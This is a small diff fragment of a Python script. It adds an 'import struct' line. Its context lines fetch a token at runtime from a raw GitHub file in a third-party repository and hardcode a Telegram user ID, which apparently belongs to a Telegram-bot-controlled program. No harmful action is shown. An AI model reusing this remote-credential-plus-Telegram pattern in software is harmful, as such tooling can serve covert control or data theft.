@@ -4,6 +4,7 @@ import urllib.request
 from urllib.request import urlopen
 import threading
 import ssl
+import struct
 
 token = urlopen('https://raw.githubusercontent.com/RahimSRO/Serapis/refs/heads/main/test.txt').read().decode("utf-8")[:-1]
 TELEGRAM_ID = '149273661'
